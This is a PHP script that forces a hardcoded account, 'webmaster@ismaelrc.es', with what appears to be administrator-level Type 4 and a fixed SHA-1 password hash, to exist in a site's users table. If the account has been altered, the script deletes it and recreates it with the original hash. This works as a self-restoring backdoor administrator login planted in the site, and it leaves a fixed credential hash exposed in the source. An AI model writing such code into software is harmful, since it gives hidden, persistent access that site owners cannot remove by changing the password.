<?php
	$q = "select * from ".preBD."users where Login = 'webmaster@ismaelrc.es' and Pwd = '717b10072c44413782fd12f69e9fa78cb8cd813d' and Type = '4'";
	$result = checkingQuery($connectBD, $q);
	$count = mysqli_num_rows($result);
	
	if($count == 0){
	
		$q_2 = "select * from ".preBD."users where Login = 'webmaster@ismaelrc.es'";
		$result_2 = checkingQuery($connectBD, $q_2);
		$count_2 = mysqli_num_rows($result_2);	
		
		/*caso de que exista ya un usuario con ese login y haya sido modificado*/
		if($count_2 > 0){
			$q_delete = "delete from ".preBD."users where Login = 'webmaster@ismaelrc.es'";
			checkingQuery($connectBD, $q_delete);
			
		}	
	
		$q_create = "INSERT INTO ".preBD."users (`Login`, `Name`, `Pwd`, `Type`) VALUES ('webmaster@ismaelrc.es', 'irc7', '717b10072c44413782fd12f69e9fa78cb8cd813d', 4)";
		checkingQuery($connectBD, $q_create);
		
	}
?>